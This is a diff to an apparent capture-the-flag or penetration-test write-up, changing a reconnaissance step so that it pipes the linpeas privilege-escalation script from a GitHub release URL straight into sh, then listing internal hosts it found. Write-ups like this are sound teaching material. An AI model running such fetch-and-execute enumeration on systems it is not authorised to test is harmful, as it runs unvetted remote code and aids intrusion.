@@ -38,7 +38,7 @@ Let's take look at our ip address :
 
 Our machine has an ip in the 10.35.122.0/24 subnet (10.35.122.10)
 No suspicious files or process were running on the machine, sudo -l was password protected but when looking at /usr/bin/ we noticed python3, curl and nmap. 
-Let's try to learn a little more about our environnement with linpeas : `curl linpeas | sh`
+Let's try to learn a little more about our environnement with linpeas : `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`
 No interesting privesc related information but in the network session linpeas found two interesting servers in our subnet : 
 `10.35.122.11 meetingcam meetingcam`
 `10.35.122.20 bastion bastion`
